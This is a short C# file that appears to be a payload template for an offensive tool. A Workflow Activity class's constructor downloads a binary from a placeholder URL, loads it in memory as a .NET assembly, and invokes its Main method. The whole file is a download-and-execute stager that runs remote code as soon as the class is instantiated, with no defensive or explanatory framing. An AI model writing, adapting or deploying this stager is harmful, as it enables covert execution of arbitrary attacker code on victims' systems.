using System;
using System.Reflection;
using System.Workflow.ComponentModel;

public class Run : Activity{
    public Run() {
        System.Net.WebClient client = new System.Net.WebClient();
        byte[] data = client.DownloadData("{{URL}}");
        Assembly asm = Assembly.Load(data);
        Type program = asm.GetType("Craft.Program");
        MethodInfo main = program.GetMethod("Main", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
        main.Invoke(null, null);
    }
}